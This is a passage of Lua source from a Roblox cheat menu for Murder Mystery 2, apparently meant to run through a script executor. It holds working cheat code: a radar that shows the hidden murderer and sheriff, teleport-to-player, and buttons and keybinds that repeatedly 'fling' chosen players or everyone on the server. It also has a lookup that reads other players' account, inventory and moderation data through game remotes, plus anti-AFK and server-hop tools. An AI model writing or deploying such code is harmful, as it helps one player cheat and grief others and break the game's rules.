		local root=getHRP(LocalPlayer.Character); if not root then return end
		local seen={}; local range=NOKia.radarRange or 200
		local seen3D={}
		if radarFrame.Visible then refreshRoomBackground(root,range) else for _,block in pairs(roomBlocks) do block.Visible=false end end
		for _,player in ipairs(NOKia.plrs) do
			if player~=LocalPlayer and alive(player) then
				local targetRoot=getHRP(player.Character)
				if targetRoot then
					local role=roleOf(player)
					local show=(role=="Murderer" and flags.radarMurderer) or (isGunRole(role) and flags.radarSheriff) or ((role~="Murderer" and not isGunRole(role)) and flags.radarPlayers)
					if show then
						local color=role=="Murderer" and Color3.fromRGB(255,75,75) or (isGunRole(role) and Color3.fromRGB(85,160,255) or Color3.fromRGB(90,230,145))
						local id="player_"..player.UserId; local tag=role=="Murderer" and "M" or (isGunRole(role) and "S" or "")
						if radarFrame.Visible then setPoint(id,targetRoot.Position,color,tag,root.Position,range,seen) end
						if flags.radar3D then set3D(id,targetRoot,color,(tag~="" and "["..tag.."] " or "")..(player.DisplayName or player.Name),seen3D) end
					end
				end
			end
		end
		if flags.radarCoins then
			local nearest={}
			for _,coin in ipairs(coinCache) do if coin.Parent and not coinTaken(coin) then nearest[#nearest+1]=coin end end
			table.sort(nearest,function(a,b) return (a.Position-root.Position).Magnitude<(b.Position-root.Position).Magnitude end)
			for index=1,math.min(20,#nearest) do
				local id="coin_"..index
				if radarFrame.Visible then setPoint(id,nearest[index].Position,Color3.fromRGB(255,210,55),"",root.Position,range,seen) end
				if flags.radar3D then set3D(id,nearest[index],Color3.fromRGB(255,210,55),"COIN",seen3D) end
			end
		end
		local gun=droppedGun or findDroppedGun()
		if flags.radarGun and gun and gun.Parent then
			if radarFrame.Visible then setPoint("gun",gun.Position,Color3.fromRGB(90,205,255),"G",root.Position,range,seen) end
			if flags.radar3D then set3D("gun",gun,Color3.fromRGB(90,205,255),"DROPPED GUN",seen3D) end
		end
		for id,marker in pairs(points) do if not seen[id] then marker.Visible=false end end
		for id,marker in pairs(radar3D) do if not seen3D[id] then marker.Enabled=false end end
	end)

	local spectator=Tabs.GUI:AddLeftGroupbox("Spectator")
	spectator:AddDropdown("SpectatePlayer",{SpecialType="Player",ExcludeLocalPlayer=true,Text="Player To Follow",Tooltip="Choose a player to follow with your camera."})
	local function stopSpectating()
		flags.spectate=false
		if Toggles.Spectate and Toggles.Spectate.Value then Toggles.Spectate:SetValue(false) end
		local hum=LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		if hum then Camera.CameraSubject=hum end
	end
	local function refreshSpectator()
		if not flags.spectate then return end
		local player=resolvePlayer(Options.SpectatePlayer.Value)
		local hum=player and player.Character and player.Character:FindFirstChildOfClass("Humanoid")
		if hum and hum.Health>0 then Camera.CameraSubject=hum else stopSpectating() end
	end
	spectator:AddToggle("Spectate",{Text="Follow Selected Player",Disabled=true,DisabledTooltip="Choose a player first.",Tooltip="Makes your camera follow the selected player. Turn it off to return to yourself.",Callback=function(value) flags.spectate=value; if value then refreshSpectator() else stopSpectating() end end})
	Options.SpectatePlayer:OnChanged(function()
		local selected=resolvePlayer(Options.SpectatePlayer.Value)
		Toggles.Spectate:SetDisabled(not selected)
		if not selected and Toggles.Spectate.Value then Toggles.Spectate:SetValue(false) end
		refreshSpectator()
	end)
	spectator:AddButton({Text="Stop Spectating",Tooltip="Returns your camera to your own character.",Func=stopSpectating})
	NOKia.spectatorRows={spectator:AddLabel("Alive: ...",true),spectator:AddLabel("Dead: ...",true)}

	local radarGroup=Tabs.GUI:AddRightGroupbox("2D Radar")
	radarGroup:AddToggle("Radar2D",{Text="Show Local Radar",Tooltip="Shows nearby players, coins and the dropped gun. Red M is murderer, blue S is sheriff or hero, yellow points are coins.",Callback=function(value) flags.radar2D=value end})
	radarGroup:AddToggle("RadarRoomBackground",{Text="Show Local Room Background",Tooltip="Draws nearby static walls and objects as a faint local floor plan behind the radar markers.",Callback=function(value) flags.radarRoomBackground=value end})
	radarGroup:AddToggle("Radar3D",{Text="Show 3D Radar",Tooltip="Shows the same selected radar targets as floating local markers in the 3D world.",Callback=function(value) flags.radar3D=value end})
	radarGroup:AddToggle("RadarPlayers",{Text="Show Innocent Players",Default=true,Tooltip="Shows players who are neither murderer nor sheriff/hero.",Callback=function(value) flags.radarPlayers=value end})
	radarGroup:AddToggle("RadarMurderer",{Text="Show Murderer",Default=true,Callback=function(value) flags.radarMurderer=value end})
	radarGroup:AddToggle("RadarSheriff",{Text="Show Sheriff / Hero",Default=true,Callback=function(value) flags.radarSheriff=value end})
	radarGroup:AddToggle("RadarCoins",{Text="Show Coins",Default=true,Callback=function(value) flags.radarCoins=value end})
	radarGroup:AddToggle("RadarGun",{Text="Show Dropped Gun",Default=true,Callback=function(value) flags.radarGun=value end})
	radarGroup:AddSlider("RadarRange",{Text="Radar Range",Default=200,Min=50,Max=600,Rounding=0,Callback=function(value) NOKia.radarRange=value end})
	radarGroup:AddLabel("Radar is local: only you can see it.")

	local performance=Tabs.GUI:AddRightGroupbox("Performance")
	NOKia.performanceRows={performance:AddLabel("FPS: ...",true),performance:AddLabel("Ping: ...",true),performance:AddLabel("Memory: ...",true),performance:AddLabel("Network quality: ...",true)}
	local frameCount,lastFrame=0,os.clock()
	bind(RunService.RenderStepped,function()
		frameCount+=1
		if os.clock()-lastFrame>=.5 then NOKia.performanceFps=math.floor(frameCount/(os.clock()-lastFrame)+.5); frameCount=0; lastFrame=os.clock() end
	end)
	task.spawn(function() while not Library.Unloaded do
		refreshSpectator()
		local aliveCount,deadCount=0,0
		for _,player in ipairs(NOKia.plrs) do if player~=LocalPlayer then if alive(player) then aliveCount+=1 else deadCount+=1 end end end
		if NOKia.spectatorRows then NOKia.spectatorRows[1]:SetText("Alive: "..aliveCount); NOKia.spectatorRows[2]:SetText("Dead: "..deadCount) end
		local ping=math.floor(netPing()*1000); local memory=0; pcall(function() memory=math.floor(Stats:GetTotalMemoryUsageMb()) end)
		local quality=ping<80 and "Excellent" or (ping<140 and "Good" or (ping<220 and "Fair" or "Poor"))
		if NOKia.performanceRows then
			NOKia.performanceRows[1]:SetText("FPS: "..tostring(NOKia.performanceFps or 0))
			NOKia.performanceRows[2]:SetText("Ping: "..ping.." ms")
			NOKia.performanceRows[3]:SetText("Memory: "..memory.." MB")
			NOKia.performanceRows[4]:SetText("Network quality: "..quality)
		end
		task.wait(.5)
	end end)
end
NOKia.buildLocalToolsPage()

do local g=Tabs.Teleport:AddLeftGroupbox("Player Actions")
	local selectedDropdown=g:AddDropdown("TpPlayer",{SpecialType="Player",ExcludeLocalPlayer=true,Text="Select Player",Tooltip="Target used by the buttons and Auto Fling below"})
	local selectedAutoFling=g:AddToggle("AutoFlingSelected",{Text="Auto Fling Selected Player",Disabled=true,
		Tooltip="Continuously flings the player selected above.",DisabledTooltip="Select a player first.",Callback=function(v) flags.autoFlingSelected=v end})
	local function updateSelectedAutoFling()
		local player=resolvePlayer(Options.TpPlayer.Value)
		local valid=player and player~=LocalPlayer
		if not valid and selectedAutoFling.Value then selectedAutoFling:SetValue(false) end
		selectedAutoFling:SetDisabled(not valid)
	end
	selectedDropdown:OnChanged(updateSelectedAutoFling)
	updateSelectedAutoFling()
	g:AddButton({Text="Teleport To Player",Tooltip="Drops you just above the selected player",Func=function()
		local p=resolvePlayer(Options.TpPlayer.Value)
		if not p then notify("Pick a player first"); return end
		local ch=p.Character; local h=ch and ch:FindFirstChildOfClass("Humanoid"); local root=(h and h.RootPart) or getHRP(ch)
		if root then tpTo(root.Position); notify("Teleported to "..(p.DisplayName or p.Name))
		else notify((p.DisplayName or p.Name).." is dead, no character to teleport to") end end})
	g:AddButton({Text="Fling Player",Tooltip="Launches the selected player using physics. You return to where you were.",Func=function()
		local p=resolvePlayer(Options.TpPlayer.Value)
		if not p then notify("Pick a player first"); return end
		if not (p.Character and getHRP(p.Character)) then notify((p.DisplayName or p.Name).." is dead, nothing to fling"); return end
		notify("Flinging "..(p.DisplayName or p.Name))
		task.spawn(function() NOKia.flingWithMode(p) end) end})
	g:AddButton({Text="Fling All Players",Tooltip="Flings everyone in the server one after another, then puts you back",Func=flingAll})
	g:AddToggle("UltraFling",{Text="Ultra Fling — EXPERIMENTAL",Tooltip="Uses the dedicated high-velocity contact method from flingscript.lua. Normal Fling keeps its original method.",Callback=function(v) flags.ultraFling=v end})
	g:AddToggle("AutoFlingMurd",{Text="Auto Fling Murderer",Tooltip="Flings the murderer on sight, over and over, for as long as this is on.",Callback=function(v) flags.autoFlingMurderer=v end})
	g:AddToggle("AutoFlingSher",{Text="Auto Fling Sheriff",Tooltip="Flings whoever is holding the gun, sheriff or hero, on sight.",Callback=function(v) flags.autoFlingSheriff=v end})
end
do local g=Tabs.Teleport:AddRightGroupbox("Role Fling Keybinds")
	local function flingRole(match,label)
		local chosen
		for _,player in ipairs(NOKia.plrs) do
			if player~=LocalPlayer and alive(player) and match(roleOf(player)) and player.Character and getHRP(player.Character) then
				chosen=player
				break
			end
		end
		if not chosen then notify("No "..label.." found"); return end
		notify("Flinging "..label..": "..(chosen.DisplayName or chosen.Name))
		task.spawn(function() NOKia.flingWithMode(chosen) end)
	end
	local sheriffButton=g:AddButton({Text="Fling Sheriff / Hero",Tooltip="Fling the sheriff or hero once. Assign a key in the small box beside this button.",Func=function()
		flingRole(isGunRole,"sheriff")
	end})
	local sheriffKey=sheriffButton:AddKeyPicker("FlingSheriffKey",{Default="None",Mode="Press",Text="Fling Sheriff"})
	NOKia.addKeyTrash("FlingSheriffKey","Fling Sheriff / Hero",true)
	local murdererButton=g:AddButton({Text="Fling Murderer",Tooltip="Fling the current murderer once. Assign a key in the small box beside this button.",Func=function()
		flingRole(function(role) return role=="Murderer" end,"murderer")
	end})
	local murdererKey=murdererButton:AddKeyPicker("FlingMurdererKey",{Default="None",Mode="Press",Text="Fling Murderer"})
	NOKia.addKeyTrash("FlingMurdererKey","Fling Murderer",true)
	g:AddLabel("Press the assigned key once to fling that role. The same key may be used elsewhere.")
end

do
	local ItemDB
	pcall(function() ItemDB=require(RS:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item")) end)
	local ACC_LINES,MM2_LINES,INV_LINES=8,7,10
	local accLabels,mm2Labels,invLabels={},{},{}
	local lastLookupText=""
	local function fill(labels,n,t)
		for i=1,n do pcall(function() labels[i]:SetText(t[i] or "") end) end
	end
	local function clearLookup(msg)
		fill(accLabels,ACC_LINES,{msg or ""})
		fill(mm2Labels,MM2_LINES,{})
		fill(invLabels,INV_LINES,{})
	end
	local function countKeys(t)
		local c=0
		if type(t)=="table" then for _ in pairs(t) do c=c+1 end end
		return c
	end
	local function httpJson(url)
		local ok,res=pcall(function() return game:HttpGet(url) end)
		if not ok then return nil end
		local ok2,d=pcall(function() return HttpService:JSONDecode(res) end)
		return ok2 and d or nil
	end
	local ViewProfileModule,WindowService
	pcall(function() ViewProfileModule=require(RS:WaitForChild("Modules"):WaitForChild("ViewProfileModule")) end)
	pcall(function() WindowService=require(RS:WaitForChild("Modules"):WaitForChild("WindowService")) end)
	local function findViewProfileFrame()
		local pg=LocalPlayer:FindFirstChild("PlayerGui")
		local main=pg and pg:FindFirstChild("MainGUI")
		local gameF=main and main:FindFirstChild("Game")
		return gameF and gameF:FindFirstChild("ViewProfile")
	end
	local function openProfileWindow(p)
		if not (ViewProfileModule and WindowService) then notify("Profile viewer unavailable"); return end
		local frame=findViewProfileFrame()
		if not frame then notify("Profile window not loaded yet"); return end
		notify("Opening "..p.Name.."'s profile...")
		task.spawn(function()
			local ok,err=pcall(function()
				local data=RS.Remotes.Misc.GetPlayerProfile:InvokeServer(p.Name)
				ViewProfileModule.GenerateProfile(frame,p.Name,data)
				WindowService:ViewFrame("ViewProfile")
			end)
			if not ok then notify("Couldn't open profile: "..tostring(err):sub(1,60),5) end
		end)
	end
	local lookupBusy=false
	local function doLookup()
		if lookupBusy then return end
		local p=resolvePlayer(Options.LookupPlayer.Value)
		if not p then notify("Pick a player first"); return end
		lookupBusy=true
		clearLookup("Looking up "..p.Name.."...")
		task.spawn(function()
			local A,M,I={},{},{}

			local info=httpJson("https://users.roblox.com/v1/users/"..p.UserId)
			local joined="?"
			if info and info.created then
				local y,mo,d=tostring(info.created):match("^(%d+)-(%d+)-(%d+)")
				joined=(d and (d.."/"..mo.."/"..y)) or tostring(info.created):sub(1,10)
			end
			local tags={}
			if p.MembershipType==Enum.MembershipType.Premium then tags[#tags+1]="Premium" end
			if info and info.hasVerifiedBadge then tags[#tags+1]="Verified" end
			if info and info.isBanned then tags[#tags+1]="BANNED" end
			local fc=httpJson("https://friends.roblox.com/v1/users/"..p.UserId.."/friends/count")
			local fl=httpJson("https://friends.roblox.com/v1/users/"..p.UserId.."/followers/count")
			local age=p.AccountAge or 0
			A[1]="Name:  "..p.Name
			A[2]="Display:  "..p.DisplayName
			A[3]="User ID:  "..p.UserId
			A[4]="Joined:  "..joined
			A[5]="Age:  "..age.."d  ("..string.format("%.1f",age/365).."y)"
			A[6]="Status:  "..(#tags>0 and table.concat(tags,", ") or "-")
			A[7]="Friends:  "..tostring(fc and fc.count or "?")
			A[8]="Followers:  "..tostring(fl and fl.count or "?")

			local rd=roundData(p)
			M[1]="Level:  "..tostring(p:GetAttribute("Level") or "?")
			M[2]="Prestige:  "..tostring(p:GetAttribute("Prestige") or "?")
			M[3]="XP:  "..tostring(p:GetAttribute("XP") or "?")
			M[4]="Role:  "..roleOf(p)..((rd and rd.Dead) and "  (dead)" or "")
			M[5]="Perk:  "..tostring((rd and rd.Perk) or p:GetAttribute("EquippedPerk") or "?")
			M[6]="Knife:  "..tostring(p:GetAttribute("EquippedKnife") or "?")
			M[7]="Gun:  "..tostring(p:GetAttribute("EquippedGun") or "?")

			local okI,inv=pcall(function() return RS.Remotes.Extras.GetFullInventory:InvokeServer(p) end)
			if okI and type(inv)=="table" then
				local byR,total={},0
				local owned=(type(inv.Weapons)=="table") and inv.Weapons.Owned or nil
				if type(owned)=="table" then
					for id,cnt in pairs(owned) do
						local n=tonumber(cnt) or 1
						local it=ItemDB and ItemDB[id]
						local r=(it and it.Rarity) or "Other"
						byR[r]=(byR[r] or 0)+n
						total=total+n
					end
				end
				local rare=(byR.Ancient or 0)+(byR.Godly or 0)+(byR.Legendary or 0)+(byR.Unique or 0)
				I[1]="Weapons:  "..total
				I[2]="Ancient:  "..(byR.Ancient or 0)
				I[3]="Godly:  "..(byR.Godly or 0)
				I[4]="Legendary:  "..(byR.Legendary or 0)
				I[5]="Unique:  "..(byR.Unique or 0)
				I[6]="Other:  "..math.max(total-rare,0)
				I[7]="Pets:  "..countKeys(inv.Pets)
				I[8]="Effects:  "..countKeys(inv.Effects)
				I[9]="Trades:  "..countKeys(inv.TradeHistory)
				I[10]="Bans:  "..countKeys(inv.Bans).."   ModLog:  "..countKeys(inv.ModLog)
			else
				I[1]="unavailable"
			end

			local flat={"ACCOUNT"}
			for _,v in ipairs(A) do flat[#flat+1]=v end
			flat[#flat+1]=""; flat[#flat+1]="MM2"
			for _,v in ipairs(M) do flat[#flat+1]=v end
			flat[#flat+1]=""; flat[#flat+1]="INVENTORY"
			for _,v in ipairs(I) do flat[#flat+1]=v end
			lastLookupText=table.concat(flat,"\n")

			fill(accLabels,ACC_LINES,A)
			fill(mm2Labels,MM2_LINES,M)
			fill(invLabels,INV_LINES,I)
			lookupBusy=false
		end)
	end
	do local g=Tabs.Lookup:AddLeftGroupbox("Player Lookup")
		g:AddDropdown("LookupPlayer",{SpecialType="Player",Text="Select Player",Tooltip="Anyone in the server, including yourself"})
		g:AddButton({Text="Look Up Player",Tooltip="Reads Roblox account info and their full MM2 profile",Func=doLookup})
		g:AddButton({Text="View Full Inventory",Tooltip="Opens MM2's own profile window for them, with every weapon, pet, effect and emote",Func=function()
			local p=resolvePlayer(Options.LookupPlayer.Value)
			if not p then notify("Pick a player first"); return end
			openProfileWindow(p)
		end})
		g:AddButton({Text="Copy Results",Tooltip="Copies the last lookup to your clipboard",Func=function()
			if #lastLookupText==0 then notify("Nothing to copy yet"); return end
			if typeof(setclipboard)=="function" then setclipboard(lastLookupText); notify("Copied to clipboard")
			else notify("Your executor has no setclipboard") end
		end})
	end
	do local g=Tabs.Lookup:AddLeftGroupbox("Account")
		for i=1,ACC_LINES do accLabels[i]=g:AddLabel("",true) end
	end
	do local g=Tabs.Lookup:AddRightGroupbox("MM2 Profile")
		for i=1,MM2_LINES do mm2Labels[i]=g:AddLabel("",true) end
	end
	do local g=Tabs.Lookup:AddRightGroupbox("Inventory")
		for i=1,INV_LINES do invLabels[i]=g:AddLabel("",true) end
	end
	clearLookup("Pick a player and press Look Up")
end
do local g=Tabs.Safety:AddLeftGroupbox("Protection")
	local safetyButton=g:AddButton({Text="Safety Mode",Tooltip="Immediately stops fly, noclip, coin bots, role bots, fling and automated teleports.",Func=NOKia.activateSafetyMode})
	safetyButton:AddKeyPicker("SafetyModeKey",{Default="None",Mode="Press",Text="Safety Mode Key"})
	NOKia.addKeyTrash("SafetyModeKey","Safety Mode",true)
	g:AddToggle("AntiFling",{Text="Anti Fling",Tooltip="Blocks other exploiters from flinging you. Stands down while the game teleports you between rounds.",Callback=function(v) flags.antiFling=v end})
	g:AddToggle("PauseAntiFlingDuringFling",{Text="Pause Anti Fling During Fling",Default=true,Tooltip="Temporarily pauses Anti Fling immediately before one of your own fling actions, then restores it automatically.",Callback=function(v) flags.pauseAntiFlingDuringFling=v end})
	g:AddToggle("AntiTrap",{Text="Anti Trap",Tooltip="UNTESTED. Cancels the slow when you walk into a murderer trap, so you keep full speed.",Callback=function(v) flags.antiTrap=v end})
end
do local g=Tabs.Safety:AddRightGroupbox("Awareness")
	g:AddToggle("MurdNotify",{Text="Murderer Notify",Tooltip="A notification that sticks around updating their distance while the murderer is within 50 studs.",Callback=function(v) flags.murdererNotify=v end})
	g:AddToggle("AntiAfk",{Text="Anti-AFK",Tooltip="Stops the 20 minute idle kick.",Callback=function(v) flags.antiAfk=v end})
end
do local g=Tabs.Server:AddLeftGroupbox("This Server")
	local rows={}
	for _,name in ipairs({"Players","Region","Server Type","Uptime","Your Ping","Server FPS","Place Version","Job ID"}) do
		rows[name]=g:AddLabel(name..": ...",true)
	end
	local function setRow(name,text)
		local r=rows[name]
		if r and r.SetText then pcall(function() r:SetText(name..": "..text) end) end
	end
	local region="..."
	task.spawn(function()
		local ok,code=pcall(function()
			return game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(LocalPlayer)
		end)
		region=(ok and code and #code>0) and code or "Unknown"
	end)
	local jobText=(game.JobId~="" and game.JobId) or "(Studio)"
	task.spawn(function() while not Library.Unloaded do
			pcall(function()
				setRow("Players",#Players:GetPlayers().."/"..Players.MaxPlayers)
				setRow("Region",region)
				local stype
				if game.PrivateServerId=="" then stype="Public"
				elseif game.PrivateServerOwnerId==0 then stype="Reserved"
				else stype="Private (VIP)" end
				setRow("Server Type",stype)
				local up=math.floor(workspace.DistributedGameTime)
				setRow("Uptime",string.format("%dm %ds",up//60,up%60))
				setRow("Your Ping",math.floor(netPing()*1000).."ms")
				setRow("Server FPS",tostring(math.floor(workspace:GetRealPhysicsFPS()+0.5)))
				setRow("Place Version",tostring(game.PlaceVersion))
				setRow("Job ID",jobText)
			end)
			task.wait(1)
		end end)
end
do local g=Tabs.Server:AddRightGroupbox("Actions")
	g:AddButton({Text="Rejoin",Tooltip="Rejoins this same server",Func=rejoin})
	g:AddButton({Text="Server Hop",Tooltip="Joins the fullest server you can",Func=serverHop})
	g:AddButton({Text="Copy Job ID",Tooltip="Copies this server's job id to your clipboard",Func=function()
		if game.JobId=="" then notify("No job id in Studio"); return end
		if typeof(setclipboard)=="function" then setclipboard(game.JobId); notify("Job ID copied")
		else notify("Your executor has no setclipboard") end
	end})
end
do
	local g=Tabs.Server:AddLeftGroupbox("Server Finder")
	local resultByLabel={}
	local searching=false
	local searchToken=0

	g:AddSlider("ServerMinPlayers",{Text="Between: minimum players",Default=2,Min=0,Max=100,Rounding=0,
		Tooltip="Example: set 2 here and 3 below to find servers with 2 or 3 players."})
	g:AddSlider("ServerMaxPlayers",{Text="Between: maximum players",Default=3,Min=1,Max=100,Rounding=0,
		Tooltip="The search automatically looks from the emptiest or fullest side, depending on this range."})
	g:AddToggle("ServerHideFull",{Text="Only servers with a free slot",Default=true,Tooltip="Never show a server you cannot join."})
	g:AddDropdown("ServerResult",{Text="Servers found",Values={"Press Find Servers"},Default="Press Find Servers",AllowNull=true,
		Tooltip="Pick a server, then use Join Selected."})
	local function showResults(labels)
		pcall(function()
			Options.ServerResult:SetValues(labels)
			Options.ServerResult:SetValue(labels[1])
		end)
	end

	local function searchServers()
		if searching then notify("Server search already running"); return end
		searching=true
		searchToken=searchToken+1
		local requestToken=searchToken
		notify("Finding matching servers...",2)
		-- HttpGet itself cannot be cancelled, so this watchdog releases the UI after 10 seconds.
		task.delay(10,function()
			if searching and searchToken==requestToken then
				searching=false
				searchToken=searchToken+1 -- ignore a late response from Roblox
				resultByLabel={}
				showResults({"Search timed out - try again"})
				notify("Server search took too long. No result was returned in 10 seconds.")
			end
		end)
		task.spawn(function()
			local minPlayers=math.clamp(tonumber(Options.ServerMinPlayers.Value) or 0,0,100)
			local maxPlayers=math.clamp(tonumber(Options.ServerMaxPlayers.Value) or 100,1,100)
			if minPlayers>maxPlayers then minPlayers,maxPlayers=maxPlayers,minPlayers end
			-- Small ranges are found fastest from the emptiest servers; larger ones from the fullest.
			local order=maxPlayers<=8 and "Asc" or "Desc"
			local started=os.clock()
			local pages=maxPlayers<=8 and 3 or 2
			local matches={}
			for _,server in ipairs(fetchServers(game.PlaceId,pages,order,started+10)) do
				local playing=tonumber(server.playing) or 0
				local capacity=tonumber(server.maxPlayers) or 0
				local full=capacity>0 and playing>=capacity
				local isCurrent=server.id==game.JobId
				if server.id and playing>=minPlayers and playing<=maxPlayers
					and (not Options.ServerHideFull.Value or not full)
					and not isCurrent then
					matches[#matches+1]=server
				end
			end
			table.sort(matches,function(a,b)
				local ap, bp=tonumber(a.playing) or 0,tonumber(b.playing) or 0
				if order=="Asc" then return ap<bp end
				return ap>bp
			end)
			if searchToken~=requestToken then return end
			resultByLabel={}
			local labels={}
			for index,server in ipairs(matches) do
				local label=string.format("%d/%d players  |  %s",tonumber(server.playing) or 0,tonumber(server.maxPlayers) or 0,string.sub(server.id,1,8))
				resultByLabel[label]=server
				labels[index]=label
			end
			if #labels==0 then labels={"No servers match these conditions"} end
			showResults(labels)
			searching=false
			notify(#matches.." matching server"..(#matches==1 and "" or "s").." found in "..string.format("%.1f",os.clock()-started).."s")
		end)
	end

	g:AddButton({Text="Find Servers",Tooltip="Fast smart search for your player range.",Func=searchServers})
	g:AddButton({Text="Join Selected",Tooltip="Teleports directly to the highlighted matching server.",Func=function()
		local server=resultByLabel[Options.ServerResult.Value]
		if not server then notify("Search for a server and select a result first"); return end
		notify("Joining selected server...")
		pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId,server.id,LocalPlayer) end)
	end})
	g:AddButton({Text="Find and Join",Tooltip="Finds the best matching server, then joins it.",Func=function()
		searchServers()
		task.spawn(function()
			local untilTime=os.clock()+11
			while searching and os.clock()<untilTime do task.wait(.1) end
			local server=resultByLabel[Options.ServerResult.Value]
			if server then
				notify("Joining best match...")
				pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId,server.id,LocalPlayer) end)
			else
				notify("No matching server found in this quick search")
			end
		end)
	end})
	g:AddLabel("The search is limited to about 10 seconds, then shows the best matches found.")
end
local MenuGroup=Tabs.UI:AddLeftGroupbox("Menu")
MenuGroup:AddButton({Text="Unload",Tooltip="Removes the menu and undoes every change it made",Func=function() Library:Unload() end})
local menuKey=MenuGroup:AddLabel("Menu bind"):AddKeyPicker("MenuKeybind",{Default="RightShift",NoUI=true,Text="Menu keybind"})
NOKia.addKeyTrash("MenuKeybind","Menu bind",false)
Library.ToggleKeybind=Options.MenuKeybind
local MiniGui=trackGui(create("ScreenGui",{Name=rnd(),ResetOnSpawn=false,IgnoreGuiInset=false,DisplayOrder=999,Parent=mountTarget}))
local MiniBtn=create("TextButton",{Name=rnd(),AnchorPoint=Vector2.new(0,0.5),Position=UDim2.new(0,18,0.5,0),Size=UDim2.fromOffset(38,38),AutoButtonColor=false,Text="",BackgroundColor3=Library.Scheme.BackgroundColor,Visible=false,Parent=MiniGui},
{create("UICorner",{CornerRadius=UDim.new(0,Library.CornerRadius)})})
MiniBtnRef=MiniBtn
do
	local TOUCH=UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
	flags.touchPad=TOUCH
	local Pad=trackGui(create("ScreenGui",{Name=rnd(),ResetOnSpawn=false,IgnoreGuiInset=false,DisplayOrder=999,Parent=mountTarget}))
	local Holder=create("Frame",{Name=rnd(),AnchorPoint=Vector2.new(1,0.5),Position=UDim2.new(1,-14,0.5,0),Size=UDim2.fromOffset(58,196),BackgroundTransparency=1,Visible=false,Active=true,Parent=Pad})
	local function mk(order,label,onSet)
		local b=create("TextButton",{Name=rnd(),Size=UDim2.fromOffset(58,58),Position=UDim2.fromOffset(0,(order-1)*69),AutoButtonColor=false,Text=label,
			Font=Enum.Font.GothamBold,TextSize=20,TextColor3=Library.Scheme.FontColor,BackgroundColor3=Library.Scheme.BackgroundColor,BackgroundTransparency=0.15,Visible=false,Parent=Holder},
		{create("UICorner",{CornerRadius=UDim.new(1,0)}),create("UIStroke",{Color=Library.Scheme.AccentColor,Thickness=1.5,Transparency=0.35})})
		local function setState(on)
			onSet(on)
			b.BackgroundColor3=on and Library.Scheme.AccentColor or Library.Scheme.BackgroundColor
		end
		b.InputBegan:Connect(function(i)
			if i.UserInputType==Enum.UserInputType.Touch or i.UserInputType==Enum.UserInputType.MouseButton1 then setState(true) end
		end)
		b.InputEnded:Connect(function(i)
			if i.UserInputType==Enum.UserInputType.Touch or i.UserInputType==Enum.UserInputType.MouseButton1 then setState(false) end
		end)
		return b
	end
	local up=mk(1,"^",function(v) NOKia.mobUp=v end)
	local down=mk(2,"v",function(v) NOKia.mobDown=v end)
	local aim=mk(3,"O",function(v) NOKia.mobAim=v end)
	do
		local dragging,startPos,startOff=false,nil,nil
		Holder.InputBegan:Connect(function(i)
			if i.UserInputType==Enum.UserInputType.Touch or i.UserInputType==Enum.UserInputType.MouseButton1 then
				dragging=true; startPos=UserInputService:GetMouseLocation(); startOff=Holder.Position
			end
		end)
		bind(UserInputService.InputEnded,function(i)
			if i.UserInputType==Enum.UserInputType.Touch or i.UserInputType==Enum.UserInputType.MouseButton1 then dragging=false end
		end)
		bind(RunService.RenderStepped,function()
			if not dragging then return end
			local d=UserInputService:GetMouseLocation()-startPos
			Holder.Position=UDim2.new(startOff.X.Scale,startOff.X.Offset+d.X,startOff.Y.Scale,startOff.Y.Offset+d.Y)
		end)
	end
	task.spawn(function()
		while not Library.Unloaded do
			local on=flags.touchPad
			Holder.Visible=on
			if on then
				up.Visible=flags.fly
				down.Visible=flags.fly
				aim.Visible=flags.aimbot
			end
			task.wait(0.25)
		end
	end)
end
local MiniScale=create("UIScale",{Scale=1,Parent=MiniBtn})
local MiniIcon=create("TextLabel",{BackgroundTransparency=1,Size=UDim2.fromScale(1,1),Text="N",Font=Enum.Font.GothamBold,TextSize=20,TextColor3=Library.Scheme.AccentColor,Parent=MiniBtn})
NOKia.onlineUnreadBadge=create("TextLabel",{AnchorPoint=Vector2.new(.5,.5),BackgroundColor3=Color3.fromRGB(230,54,70),Position=UDim2.new(1,1,0,-1),Size=UDim2.fromOffset(20,20),Text="",Font=Enum.Font.GothamBlack,TextSize=11,TextColor3=Color3.fromRGB(255,255,255),Visible=false,ZIndex=5,Parent=MiniBtn},{create("UICorner",{CornerRadius=UDim.new(1,0)}),create("UIStroke",{Color=Color3.fromRGB(255,220,225),Thickness=1,Transparency=.15})})
NOKia.updateOnlineUnread=function()
	local count=NOKia.onlineUnread or 0
	NOKia.onlineUnreadBadge.Visible=count>0
	NOKia.onlineUnreadBadge.Text=count>99 and "99+" or tostring(count)
	NOKia.onlineUnreadBadge.Size=count>99 and UDim2.fromOffset(28,20) or UDim2.fromOffset(20,20)
end
Library:AddOutline(MiniBtn)
Library:AddToRegistry(MiniBtn,{BackgroundColor3="BackgroundColor"})
Library:AddToRegistry(MiniIcon,{TextColor3="AccentColor"})
do local dragging,moved,startInput,startPos
	bind(MiniBtn.InputBegan,function(input)
		if input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch then
			dragging=true; moved=false; startInput=input.Position; startPos=MiniBtn.Position
		end
	end)
	bind(UserInputService.InputChanged,function(input)
		if dragging and (input.UserInputType==Enum.UserInputType.MouseMovement or input.UserInputType==Enum.UserInputType.Touch) then
			local d=input.Position-startInput
			if math.abs(d.X)+math.abs(d.Y)>5 then moved=true end
			MiniBtn.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y)
		end
	end)
	bind(UserInputService.InputEnded,function(input)
		if dragging and (input.UserInputType==Enum.UserInputType.MouseButton1 or input.UserInputType==Enum.UserInputType.Touch) then
			dragging=false
			if not moved then Library:Toggle(true) end
		end
	end)
end
task.spawn(function() local shown=false while not Library.Unloaded do
		local show=flags.miniSquare and not Library.Toggled
		if Library.Toggled and Library.ActiveTab==Tabs.NokiaChat and (NOKia.onlineUnread or 0)>0 then NOKia.onlineUnread=0; NOKia.updateOnlineUnread() end
		if show~=shown then shown=show
			if show then MiniBtn.Visible=true; MiniScale.Scale=0.55
				pcall(function() TweenService:Create(MiniScale,TweenInfo.new(0.24,Enum.EasingStyle.Back,Enum.EasingDirection.Out),{Scale=1}):Play() end)
			else MiniBtn.Visible=false end
		end
		task.wait(0.06)
